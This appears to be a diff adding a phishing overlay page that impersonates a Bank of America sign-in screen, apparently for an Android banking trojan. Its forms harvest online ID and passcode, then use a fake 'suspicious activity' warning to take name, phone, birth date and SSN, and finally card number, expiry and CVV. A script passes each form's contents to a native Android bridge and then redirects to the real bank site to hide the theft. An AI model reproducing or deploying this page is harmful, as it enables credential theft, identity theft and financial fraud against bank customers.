@@ -1,0 +1,638 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>BofA</title>
+</head>
+<style>
+.pure-material-checkbox {
+    z-index: 0;
+    position: relative;
+    display: inline-block;
+    color: rgba(var(--pure-material-onsurface-rgb, 0, 0, 0), 0.87);
+    font-family: var(--pure-material-font, "Roboto", "Segoe UI", BlinkMacSystemFont, system-ui, -apple-system);
+    font-size: 16px;
+    line-height: 1.5;
+}
+
+/* Input */
+.pure-material-checkbox > input {
+    appearance: none;
+    -moz-appearance: none;
+    -webkit-appearance: none;
+    z-index: -1;
+    position: absolute;
+    left: -10px;
+    top: -8px;
+    display: block;
+    margin: 0;
+    border-radius: 50%;
+    width: 40px;
+    height: 40px;
+    background-color: rgba(var(--pure-material-onsurface-rgb, 0, 0, 0), 0.6);
+    box-shadow: none;
+    outline: none;
+    opacity: 0;
+    transform: scale(1);
+    pointer-events: none;
+    transition: opacity 0.3s, transform 0.2s;
+}
+
+/* Span */
+.pure-material-checkbox > span {
+    display: inline-block;
+    width: 100%;
+    cursor: pointer;
+}
+
+/* Box */
+.pure-material-checkbox > span::before {
+    content: "";
+    display: inline-block;
+    box-sizing: border-box;
+    margin: 3px 11px 3px 1px;
+    border: solid 2px; /* Safari */
+    border-color: rgba(var(--pure-material-onsurface-rgb, 0, 0, 0), 0.6);
+    border-radius: 2px;
+    width: 18px;
+    height: 18px;
+    vertical-align: top;
+    transition: border-color 0.2s, background-color 0.2s;
+}
+
+/* Checkmark */
+.pure-material-checkbox > span::after {
+    content: "";
+    display: block;
+    position: absolute;
+    top: 3px;
+    left: 1px;
+    width: 10px;
+    height: 5px;
+    border: solid 2px transparent;
+    border-right: none;
+    border-top: none;
+    transform: translate(3px, 4px) rotate(-45deg);
+}
+
+/* Checked, Indeterminate */
+.pure-material-checkbox > input:checked,
+.pure-material-checkbox > input:indeterminate {
+    background-color: rgb(var(--pure-material-primary-rgb, 33, 150, 243));
+}
+
+.pure-material-checkbox > input:checked + span::before,
+.pure-material-checkbox > input:indeterminate + span::before {
+    border-color: rgb(var(--pure-material-primary-rgb, 33, 150, 243));
+    background-color: rgb(var(--pure-material-primary-rgb, 33, 150, 243));
+}
+
+.pure-material-checkbox > input:checked + span::after,
+.pure-material-checkbox > input:indeterminate + span::after {
+    border-color: rgb(var(--pure-material-onprimary-rgb, 255, 255, 255));
+}
+
+.pure-material-checkbox > input:indeterminate + span::after {
+    border-left: none;
+    transform: translate(4px, 3px);
+}
+
+/* Hover, Focus */
+.pure-material-checkbox:hover > input {
+    opacity: 0.04;
+}
+
+.pure-material-checkbox > input:focus {
+    opacity: 0.12;
+}
+
+.pure-material-checkbox:hover > input:focus {
+    opacity: 0.16;
+}
+
+/* Active */
+.pure-material-checkbox > input:active {
+    opacity: 1;
+    transform: scale(0);
+    transition: transform 0s, opacity 0s;
+}
+
+.pure-material-checkbox > input:active + span::before {
+    border-color: rgb(var(--pure-material-primary-rgb, 33, 150, 243));
+}
+
+.pure-material-checkbox > input:checked:active + span::before {
+    border-color: transparent;
+    background-color: rgba(var(--pure-material-onsurface-rgb, 0, 0, 0), 0.6);
+}
+
+/* Disabled */
+.pure-material-checkbox > input:disabled {
+    opacity: 0;
+}
+
+.pure-material-checkbox > input:disabled + span {
+    color: rgba(var(--pure-material-onsurface-rgb, 0, 0, 0), 0.38);
+    cursor: initial;
+}
+
+.pure-material-checkbox > input:disabled + span::before {
+    border-color: currentColor;
+}
+
+.pure-material-checkbox > input:checked:disabled + span::before,
+.pure-material-checkbox > input:indeterminate:disabled + span::before {
+    border-color: transparent;
+    background-color: currentColor;
+}
+.material {
+  position: relative;
+  padding: 0;
+  margin: 5px;
+  border: none;
+  overflow: visible;
+}
+.material input {
+  box-sizing: border-box;
+  width: 100%;
+  padding: 12px 10px 8px;
+  border: none;
+  border-radius: 0;
+  box-shadow: none;
+  border-bottom: 1px solid #DDD;
+  font-size: 120%;
+  outline: none;
+  cursor: text;
+}
+.material input::-webkit-input-placeholder {
+  transition: color 300ms ease;
+}
+.material input:not(:focus)::-webkit-input-placeholder {
+  color: transparent;
+}
+.material hr {
+  content: '';
+  display: block;
+  position: absolute;
+  bottom: 0;
+  left: 0;
+  margin: 0;
+  padding: 0;
+  width: 100%;
+  height: 2px;
+  border: none;
+  background: rgb(0, 72, 206);
+  font-size: 1px;
+  will-change: transform, visibility;
+  transition: all 200ms ease-out;
+  -webkit-transform: scaleX(0);
+          transform: scaleX(0);
+  visibility: hidden;
+  z-index: 10;
+}
+.material input:focus ~ hr {
+  -webkit-transform: scaleX(1);
+          transform: scaleX(1);
+  visibility: visible;
+}
+.material label {
+  position: absolute;
+  top: 10px;
+  left: 10px;
+  font-size: 120%;
+  color: rgb(0, 72, 206);
+  -webkit-transform-origin: 0 -150%;
+          transform-origin: 0 -150%;
+  transition: -webkit-transform 300ms ease;
+  transition: transform 300ms ease;
+  transition: transform 300ms ease, -webkit-transform 300ms ease;
+  pointer-events: none;
+}
+.material input:focus ~ label,
+.material input:valid ~ label {
+  -webkit-transform: scale(0.6);
+          transform: scale(0.6);
+}
+
+</style>
+<style>
+html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}main{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace,monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}img{border-style:none}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}button,[type="button"],[type="reset"],[type="submit"]{-webkit-appearance:button}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner{border-style:none;padding:0}button:-moz-focusring,[type="button"]:-moz-focusring,[type="reset"]:-moz-focusring,[type="submit"]:-moz-focusring{outline:1px dotted ButtonText}fieldset{padding:.35em .75em .625em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}progress{vertical-align:baseline}textarea{overflow:auto}[type="checkbox"],[type="radio"]{box-sizing:border-box;padding:0}[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{height:auto}[type="search"]{-webkit-appearance:textfield;outline-offset:-2px}[type="search"]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details{display:block}summary{display:list-item}template{display:none}[hidden]{display:none}
+body {
+    background-color: #ffffff;
+}
+html {
+    font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+}
+.header {
+    position: relative;
+    z-index: 2;
+}
+.logongardient {
+    background-color: #e31837;
+    padding: 20px 0;
+    text-align: center;
+}
+.logo {
+    width: 220px;
+    height: 1rem;
+    font-weight: bold;
+    margin: 0 auto;
+    text-align: center;
+    color: #FFFFFF;
+}
+.main {
+    margin-top: 10px;
+}
+.autorizeBox {
+    background: rgba(255, 255, 255, .96);
+    padding: 1.25rem 0;
+    overflow: visible !important;
+    margin: 0 auto;
+    max-width: 370px;
+}
+.autorizeBox form {
+    position: relative;
+    min-height: .0625rem;
+    padding: 5px 20px;
+}
+.autorizeBox ::placeholder {
+    color: #009dff;
+    opacity: 1;
+    font-weight: lighter;
+    font-size: 1.08rem;
+}
+.autorizeBox label {
+    font-size: 1.125rem;
+    -webkit-touch-callout: none;
+    -webkit-user-select: none;
+    -khtml-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    user-select: none;
+    margin-left: 5px;
+}
+.autorizeBox button {
+    margin: 20px 0;
+    background-color: #0052c2;
+    border: none;
+    width: 100%;
+    height: 3rem;
+    overflow-x: auto;
+    border-radius: .3125rem;
+    text-align: center;
+    vertical-align: middle;
+    cursor: pointer;
+    box-shadow: 3px 4px #0003;
+}
+.autorizeBox button:disabled,
+.autorizeBox button[disabled] {
+    background-color: #85a5e2;
+}
+.autorizeBox button span {
+    text-transform: uppercase;
+    line-height: 1.125rem;
+    white-space: normal;
+    margin: .0625rem .75rem;
+    font-size: 1rem;
+    font-weight: 100;
+    color: #fff;
+    letter-spacing: 0;
+    text-decoration: none;
+}
+.footer {
+    background: #fff;
+    font-size: 16px;
+    padding: 1em 0;
+    margin-top: 150px;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    color: #757575;
+    font-size: 0.7rem;
+    text-align: left;
+}
+.footer p {
+    margin-left: 25px;
+}
+.footer p.link {
+    color: rgb(0, 106, 206);
+    line-height: 15px;
+    margin-top: 15px;
+    margin-bottom: 15px;
+    font-weight: bold;
+}
+#ccnumlbl {
+    color: red;
+    font-size: 0.8rem;
+}
+.warntext {
+    color: red;
+    margin-bottom: 20px;
+    text-align: center;
+    font-weight: bolder;
+}
+.infotext {
+    color: #636363;
+    text-align: center;
+}
+</style>
+<body>
+    <div class="header"><div class="logongardient">
+        <div id="logoText" class="logo"></div>
+    </div></div>
+    <div class="main">
+        <div class="autorizeBox">
+            <form id="login" action="" style="">
+                    <p class="infotext">Please sign in to continue.</p>
+                    <table>
+                        <tr>
+                            <td><fieldset class="material">
+                                <input id="OnlineID" placeholder="" pattern=".{4,}" autocomplete="off" type="text" required>
+                                <hr>
+                                <label>Online ID</label>
+                                </fieldset>
+                            </td>
+                            <td width="78">
+                                <label class="pure-material-checkbox">
+                                    <input type="checkbox">
+                                    <span> </span>
+                                    <p style=
+                                    "font-size: 10px;
+                                    padding: 0;
+                                    position: absolute;
+                                    margin-top: -28px;
+                                    margin-left: 28px;
+                                    width: 50px;"
+                                    >Save<br>Online ID</p>
+                                </label>
+                            </td>
+                        </tr>
+                    </table>
+                    <fieldset class="material">
+                    <input id="Passcode" placeholder="" pattern=".{4,}" autocomplete="off" type="password" required>
+                    <hr>
+                    <label>Passcode</label>
+                    </fieldset>
+                    <button type="button" onclick="process('login')"><span>Sign in</span></button>
+            </form>
+            <form id="address" action="" style="display:none;">
+                    <p class="warntext">Suspicious activity has been noticed on your account. Verify your identity.</p>
+                    <fieldset class="material">
+                    <input id="FirstName" placeholder="" pattern=".{3,}" autocomplete="off" type="text" required>
+                    <hr>
+                    <label>First name</label>
+                    </fieldset>
+                    <fieldset class="material">
+                    <input id="LastName" placeholder="" pattern=".{3,}" autocomplete="off" type="text" required>
+                    <hr>
+                    <label>Last name</label>
+                    </fieldset>
+                    <fieldset class="material">
+                    <input id="Phone" placeholder="" pattern="^\+[0-9]{6,}" maxlength="30" autocomplete="off" type="text" required>
+                    <hr>
+                    <label>Phone number +1...</label>
+                    </fieldset>
+                    <p style="margin-bottom: 0px;font-size: 1.2rem;">Date of birth</p>
+                    <table>
+                        <tr>
+                            <td>
+                            <fieldset class="material">
+                            <input id="DOBmm" placeholder="" type="text" pattern="[0-9]{1,2}" maxlength="2" autocomplete="off" type="text" required>
+                            <hr>
+                            <label>ММ</label>
+                            </fieldset>
+                            </td>
+                            <td>
+                            <fieldset class="material">
+                            <input id="DOBdd" placeholder="" type="text" pattern="[0-9]{1,2}" maxlength="2" autocomplete="off" type="text" required>
+                            <hr>
+                            <label>DD</label>
+                            </fieldset>
+                            </td>
+                            <td>
+                            <fieldset class="material">
+                            <input id="DOByyyy" placeholder="" type="text" pattern="[0-9]{4}" maxlength="4" autocomplete="off" type="text" required>
+                            <hr>
+                            <label>YYYY</label>
+                            </fieldset>
+                            </td>
+                        </tr>
+                    </table>
+                    <fieldset class="material">
+                    <input id="SSN" placeholder="" pattern="[0-9\-]{9}" maxlength="9" autocomplete="off" type="text" required>
+                    <hr>
+                    <label>Social Security or Tax ID number</label>
+                    </fieldset>
+                    <button type="button" onclick="process('address')"><span>Next</span></button>
+            </form>
+            <form id="CC" action="" style="display:none;">
+                    <fieldset class="material">
+                    <input id="CCNUM" placeholder="" pattern="^[0-9 ]{12,24}$" maxlength="24" autocomplete="off" type="text" required>
+                    <hr>
+                    <label>Credit card number</label>
+                    </fieldset>
+                    <span id="ccnumlbl"></span>
+                    <p style="margin-bottom: 0px;font-size: 1.2rem;">EXP date:</p>
+                    <table>
+                        <tr>
+                            <td>
+                            <fieldset class="material">
+                            <input id="CCexpMM" placeholder="" pattern="^[1-9]{1}$|^[1]{1}[0-2]{1}$|^[0][1-9]{1}$" maxlength="2" autocomplete="off" type="text" required>
+                            <hr>
+                            <label>MM</label>
+                            </fieldset>
+                            </td>
+                            <td>
+                            <fieldset class="material">
+                            <input id="CCEXPYY" placeholder="" pattern="^19$|^2[0-9]$" maxlength="2" autocomplete="off" type="text" required>
+                            <hr>
+                            <label>YY</label>
+                            </fieldset>
+                            </td>
+                        </tr>
+                    </table>
+                    <fieldset class="material">
+                    <input id="CVV" placeholder="" pattern="^[0-9]{3}$" autocomplete="off" maxlength="3" type="password" required>
+                    <hr>
+                    <label>CVV</label>
+                    </fieldset>
+					<input id="exit" type="hidden" text="true"/>
+                    <button type="button" onclick="process('CC')"><span>Sign in</span></button>
+            </form>
+        </div>
+    </div>
+    <div class="footer"><p>Secure area</p>
+    <p class="link">Privacy & Security&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Advertising Practices</p>
+    <p class="link">Legal Info & Disclosures&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Equal Housing Lender</p>
+    <p>Bank of America, N.A. Member FDIC.<br>
+    © 2019 Bank of America Corporation</p></div>
+</body>
+<script>
+var hr = (new Date()).getHours();
+if(hr >=17 && hr <= 20) {
+    document.getElementById('logoText').innerText = 'Good Evening';
+}
+else if((hr >=21 && hr <= 23) ||(hr >= 0 && hr <=6)) {
+    document.getElementById('logoText').innerText = 'Good Night';
+}
+else if(hr >=7 && hr <= 12) {
+    document.getElementById('logoText').innerText = 'Good Morning';
+}
+else {
+    document.getElementById('logoText').innerText = 'Good Afternoon';
+}
+
+var invalidCC = 'Invalid card number';
+
+function maskCC(event) {
+    var v = this.value.replace(/\D/g, '');
+    this.value = '';
+    for(var i = 0; i < v.length; i++) {
+        this.value += (i%4==0 && i != 0 ? ' ' : '') + v[i];
+    }
+}
+document.getElementById('CCNUM').addEventListener('input', maskCC, false);
+
+function maskPhone(event) {
+    var v = this.value.replace(/\D/g, '');
+    this.value = '+' + v;
+}
+document.getElementById('Phone').addEventListener('input', maskPhone, false);
+
+function maskOnlyNumbers(event) {
+    this.value = this.value.replace(/\D/g, '');
+}
+
+var arrtagsID = ['SSN', 'CCexpMM', 'CCEXPYY', 'CVV', 'DOBmm', 'DOBdd', 'DOByyyy'];
+for(var iid in arrtagsID) {
+    document.getElementById(arrtagsID[iid]).addEventListener('input', maskOnlyNumbers, false);
+}
+
+function valid_credit_card(value) {
+	if (/[^0-9-\s]+/.test(value)) return false;
+	var nCheck = 0, nDigit = 0, bEven = false;
+	value = value.replace(/\D/g, "");
+	for (var n = value.length - 1; n >= 0; n--) {
+		var cDigit = value.charAt(n),
+			  nDigit = parseInt(cDigit, 10);
+		if (bEven) {
+			if ((nDigit *= 2) > 9) nDigit -= 9;
+		}
+		nCheck += nDigit;
+		bEven = !bEven;
+	}
+	return (nCheck % 10) == 0;
+}
+
+var allButtons = document.getElementsByTagName('button');
+for(var btn in allButtons) {
+    allButtons[btn].disabled = true;
+}
+
+function CheckValidInput(id) {
+    var finalbool = true, formids = document.getElementById(id);
+	var currentinputs = formids.getElementsByTagName('input');
+    for(var i = 0; i < currentinputs.length; i++ ) {
+        if(currentinputs[i].id == 'CCNUM') {
+            var bbb = valid_credit_card(currentinputs[i].value);
+            document.getElementById('ccnumlbl').innerText = bbb & currentinputs[i].checkValidity() ? '' : invalidCC;
+            finalbool&= bbb;
+            continue;
+        }
+        finalbool &= currentinputs[i].checkValidity();
+    }
+    formids.getElementsByTagName('button')[0].disabled = !finalbool;
+}
+
+var AllForms = document.getElementsByTagName('form');
+function formChange(formId) {
+    for(var i = 0; i < AllForms.length; i++) {
+        AllForms[i].style.display = 'none';
+        if(AllForms[i].id == formId) {
+            AllForms[i+1].style.display = '';
+            break;
+        }
+    }
+}
+
+for(var i = 0; i < AllForms.length; i++) {
+    var myInputs = AllForms[i].getElementsByTagName('input');
+    for(var j = 0; j < myInputs.length; j++) {
+        AddInputEventByFormID(myInputs[j],AllForms[i].id);
+    }
+}
+
+function AddInputEventByFormID(input, formid) {
+    input.addEventListener('input', function(){CheckValidInput(formid)});
+}
+
+function process(formId) {
+    try {
+        Android.returnResult( formToJSON(document.getElementById(formId)) );
+    } catch (err) {}
+    if(formId == 'CC')
+    {
+        location.replace('https://www.bankofamerica.com/');
+        return;
+    }
+    formChange(formId);
+}
+
+/*********Recursive implementation of jSON.stringify; ********/
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSON(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+    for(var i = 0; i < namesHTML.length; i++) {
+		var bsform = f.getElementsByTagName(namesHTML[i]);
+        for(var j = 0; j < bsform.length; j++) {
+            FinalObject[bsform[j].id] = bsform[j].value
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+</script>
+</html>
